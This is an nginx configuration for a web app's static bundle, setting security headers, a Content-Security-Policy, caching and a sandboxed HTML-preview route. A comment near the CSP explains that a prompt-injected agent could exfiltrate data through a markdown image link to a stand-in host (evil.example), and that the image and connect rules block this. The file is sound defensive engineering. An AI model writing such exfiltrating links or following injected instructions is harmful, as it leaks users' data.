# Static bundle only. TLS, HTTP->HTTPS and routing all live in Traefik; this
# server sees plain HTTP on the container network and never terminates a cert.
#
# There is no /agent or /client block here: Traefik routes those straight to the
# relay container, so they never reach this one.

server {
    listen 80;
    server_name _;

    root /usr/share/nginx/html;
    index index.html;

    # No version in the Server header or error pages.
    server_tokens off;

    # Traefik already sets X-Forwarded-*; these are the ones it does not.
    # HSTS here because Traefik sets none: every name under the domain is served
    # over TLS, so browsers may refuse plain http for all of them (no `preload`,
    # which is a one-way submission). Permissions-Policy grants the page only the
    # microphone (voice input), and that to this origin alone.
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-Frame-Options "DENY" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    add_header Permissions-Policy "camera=(), geolocation=(), microphone=(self), payment=(), usb=()" always;
    # Enforced. It shipped Report-Only first and was switched on because of the
    # transcript: agent output is rendered markdown, an image there is fetched on
    # render, so a prompt-injected agent could exfiltrate anything it can read
    # just by writing ![](https://evil.example/?q=…). The markdown renderer
    # (web/src/components/Markdown.tsx) no longer loads images at all; img-src is
    # the same channel closed one layer down, for whatever gets past that. To
    # trial a change to this policy, ship it as Content-Security-Policy-Report-Only
    # first: the violations show in the browser console with nothing broken.
    #
    # A real CSP is possible now that Monaco is bundled (web/src/lib/monacoSetup.ts
    # calls loader.config, so nothing is fetched from cdn.jsdelivr.net any more).
    #
    # What each directive is actually holding back:
    #   script-src  — 'self' plus Clerk. `blob:` is required: Monaco's editor
    #                 worker is instantiated from a blob URL by Vite's ?worker
    #                 import, and without it every editor silently fails to load.
    #                 challenges.cloudflare.com is Clerk's sign-up captcha
    #                 (Turnstile, whenever bot protection is on): without it no
    #                 one new can sign up. clerk-js comes from the instance's
    #                 FAPI host, which for a pk_live instance is clerk.<its
    #                 domain> — matched by neither wildcard, so add it here and to
    #                 CSP_CONNECT_SRC before moving to one, or sign-in stops loading.
    #   img-src     — no room for an arbitrary host, which is the point: same
    #                 origin, data:/blob: (attachments, file previews, the favicon
    #                 badge) and img.clerk.com (avatars, Clerk's provider logos).
    #                 Recipe screenshots live on R2_PUBLIC_BASE_URL, which compose
    #                 hands in as ${CSP_IMG_SRC} (empty when R2 is not set up).
    #   media-src   — blob: for audio/video file previews; same origin for the
    #                 landing page's demo video.
    #   connect-src — the relay's own hostname (WebSocket), the storage API, and
    #                 Clerk's FAPI. An exfiltration attempt to anywhere else is
    #                 what this blocks.
    #   frame-src   — Clerk and its captcha iframe, and blob: for the PDF preview.
    #   object-src  — nothing, ever.
    #
    # `unsafe-inline` for styles only: Mantine sets inline styles throughout, and
    # style injection is not script execution. Scripts have no such allowance,
    # which is why index.html's pre-paint splash guard is a file
    # (/splash-guard.js) rather than an inline <script>.
    #
    # One route is the exception: /html-preview.html (and its script), the shell
    # the file viewer renders an agent-written HTML file in. That page is meant
    # to run its own scripts and pull libraries from any CDN, so its policy
    # allows everything — inline, eval, any host. It is safe because the same
    # policy opens with the `sandbox` directive: the browser gives the document
    # an opaque origin even if the URL is opened top-level, so nothing in it can
    # read this origin's storage, cookies, DOM or connection. The iframe carries
    # the same sandbox flags; never add allow-same-origin to either. The page
    # itself arrives by postMessage from the app and is never uploaded here.
    # X-Frame-Options is dropped there and frame-ancestors 'self' stands in.
    #
    # ${CSP_*} are substituted at image build time from the deployment's domains
    # (see deploy/docker/Dockerfile) — a policy naming the wrong origins is worse
    # than none, because it fails in a way that looks like an app bug.
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' blob: https://*.clerk.accounts.dev https://*.clerk.com https://challenges.cloudflare.com; worker-src 'self' blob:; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https://img.clerk.com ${CSP_IMG_SRC}; media-src 'self' blob:; font-src 'self' data:; connect-src 'self' ${CSP_CONNECT_SRC}; frame-src 'self' blob: https://*.clerk.accounts.dev https://*.clerk.com https://challenges.cloudflare.com; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'" always;

    gzip on;
    gzip_vary on;
    gzip_comp_level 6;
    gzip_min_length 1024;
    gzip_types text/plain text/css text/javascript application/javascript
               application/json application/wasm image/svg+xml;

    # The security headers are repeated in every location that sets one of its
    # own: nginx's add_header directives are inherited only while the child
    # block declares none, so a lone Cache-Control here silently drops them all.

    # Content-hashed filenames, so these can never go stale.
    location /assets/ {
        expires 1y;
        add_header Cache-Control "public, immutable";
        # Repeated for the reason stated above: a child block that sets any
        # add_header inherits none of the parent's.
        add_header Content-Security-Policy "default-src 'self'; script-src 'self' blob: https://*.clerk.accounts.dev https://*.clerk.com https://challenges.cloudflare.com; worker-src 'self' blob:; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https://img.clerk.com ${CSP_IMG_SRC}; media-src 'self' blob:; font-src 'self' data:; connect-src 'self' ${CSP_CONNECT_SRC}; frame-src 'self' blob: https://*.clerk.accounts.dev https://*.clerk.com https://challenges.cloudflare.com; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'" always;
        add_header X-Content-Type-Options "nosniff" always;
        add_header X-Frame-Options "DENY" always;
        add_header Referrer-Policy "strict-origin-when-cross-origin" always;
        add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
        add_header Permissions-Policy "camera=(), geolocation=(), microphone=(self), payment=(), usb=()" always;
        try_files $uri =404;
    }

    # Must not be cached: it names the current hashed bundle. Reached both
    # directly and through the SPA fallback's internal redirect below.
    location = /index.html {
        add_header Cache-Control "no-store, must-revalidate";
        add_header Content-Security-Policy "default-src 'self'; script-src 'self' blob: https://*.clerk.accounts.dev https://*.clerk.com https://challenges.cloudflare.com; worker-src 'self' blob:; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https://img.clerk.com ${CSP_IMG_SRC}; media-src 'self' blob:; font-src 'self' data:; connect-src 'self' ${CSP_CONNECT_SRC}; frame-src 'self' blob: https://*.clerk.accounts.dev https://*.clerk.com https://challenges.cloudflare.com; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'" always;
        add_header X-Content-Type-Options "nosniff" always;
        add_header X-Frame-Options "DENY" always;
        add_header Referrer-Policy "strict-origin-when-cross-origin" always;
        add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
        add_header Permissions-Policy "camera=(), geolocation=(), microphone=(self), payment=(), usb=()" always;
    }

    # The push-only service worker (web/public/sw.js). Not content-hashed, so it
    # must revalidate every time or a worker update waits out the cache. 404 when
    # missing rather than the SPA fallback: registering index.html as a worker
    # fails with a MIME error that reads like a push bug.
    location = /sw.js {
        add_header Cache-Control "no-cache";
        add_header Content-Security-Policy "default-src 'self'; script-src 'self' blob: https://*.clerk.accounts.dev https://*.clerk.com https://challenges.cloudflare.com; worker-src 'self' blob:; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https://img.clerk.com ${CSP_IMG_SRC}; media-src 'self' blob:; font-src 'self' data:; connect-src 'self' ${CSP_CONNECT_SRC}; frame-src 'self' blob: https://*.clerk.accounts.dev https://*.clerk.com https://challenges.cloudflare.com; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'" always;
        add_header X-Content-Type-Options "nosniff" always;
        add_header X-Frame-Options "DENY" always;
        add_header Referrer-Policy "strict-origin-when-cross-origin" always;
        add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
        add_header Permissions-Policy "camera=(), geolocation=(), microphone=(self), payment=(), usb=()" always;
        try_files $uri =404;
    }

    # The HTML preview shell (web/public/html-preview.html): the one permissive
    # policy, and why it is safe, is explained beside the CSP above. No
    # X-Frame-Options, so the app can frame it; 404 rather than the SPA fallback.
    location = /html-preview.html {
        add_header Cache-Control "no-cache";
        add_header Content-Security-Policy "sandbox allow-scripts allow-popups allow-forms allow-modals; default-src * data: blob: 'unsafe-inline' 'unsafe-eval'; frame-ancestors 'self'" always;
        add_header X-Content-Type-Options "nosniff" always;
        add_header Referrer-Policy "strict-origin-when-cross-origin" always;
        add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
        add_header Permissions-Policy "camera=(), geolocation=(), microphone=(self), payment=(), usb=()" always;
        try_files $uri =404;
    }

    location = /html-preview.js {
        add_header Cache-Control "no-cache";
        add_header Content-Security-Policy "sandbox allow-scripts allow-popups allow-forms allow-modals; default-src * data: blob: 'unsafe-inline' 'unsafe-eval'; frame-ancestors 'self'" always;
        add_header X-Content-Type-Options "nosniff" always;
        add_header Referrer-Policy "strict-origin-when-cross-origin" always;
        add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
        add_header Permissions-Policy "camera=(), geolocation=(), microphone=(self), payment=(), usb=()" always;
        try_files $uri =404;
    }

    # The download button's target, so every click is a logged 302 in this
    # container's access log — the only download metric, since neither page
    # carries analytics JS. ${DESKTOP_DOWNLOAD_URL} is substituted at container
    # start (see deploy/docker/Dockerfile); with no build published it is `/`.
    location = /download {
        return 302 ${DESKTOP_DOWNLOAD_URL};
    }

    # BrowserRouter — every unknown path is a client-side route.
    location / { try_files $uri $uri/ /index.html; }
}
